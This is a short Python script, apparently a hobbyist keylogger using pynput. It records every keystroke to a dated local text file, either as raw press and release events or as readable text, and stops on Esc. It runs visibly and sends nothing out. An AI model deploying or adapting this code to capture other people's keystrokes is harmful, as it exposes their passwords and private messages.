import pynput.keyboard as Keyboard
from datetime import datetime
from datetime import date

date = date.today()
date = str(date)

now = datetime.now()
time = now.strftime("%d/%m/%Y %H:%M")
time = str(time)

logdate = date+".txt"
logfile = open(logdate, 'a')

print("1) Press n Release")
print("")
print("2) Readable")
print("")
print("3) exit")
print("")
menu1 = input("-->> ")
if menu1 == "1":
    print("Press esc to stop...")
    logfile.write('\n')
    logfile.write('\n')
    logfile.write("LOGGING STARTED AT "+time)
    logfile.write('\n')
    def on_press(key):
        try:
            print(f'Key P: {key.char}')
            logfile.write(f'Key P: {key.char}'+'\n')
        except AttributeError:
            print(f'Key P: {key}')
            logfile.write(f'Key P: {key}'+'\n')

    def on_release(key):
        try:
            print(f'Key R: {key.char}')
            logfile.write(f'Key R: {key.char}'+'\n')
        except AttributeError:
            print(f'Key R: {key}')
            logfile.write(f'Key R: {key}'+'\n')
    
        if key == Keyboard.Key.esc:
            logfile.write('\n')
            logfile.write("LOGGING ENDED AT "+time)
            logfile.write('\n')
            logfile.flush()
            return False

    with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

elif menu1 == "2":
    print("Press esc to stop...")
    logfile.write('\n')
    logfile.write('\n')
    logfile.write("LOGGING STARTED AT "+time)
    logfile.write('\n')
    def on_press(key):
        if key == Keyboard.Key.space:
            logfile.write(f' ')
            print(f'\n')
        elif key == Keyboard.Key.enter:
            logfile.write(f'\n')
            print(f'\n')
        elif key == Keyboard.Key.shift:
        	pass
        else:
            try:
                print(f'{key.char}')
                logfile.write(f'{key.char}')
            except AttributeError:
                print(f'{key}')
                logfile.write(' '+f'{key}'+' ')

    def on_release(key):    
        if key == Keyboard.Key.esc:
            logfile.write('\n')
            logfile.write("LOGGING ENDED AT "+time)
            logfile.write('\n')
            logfile.flush()
            return False

    with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
elif menu1 == "3":
	exit()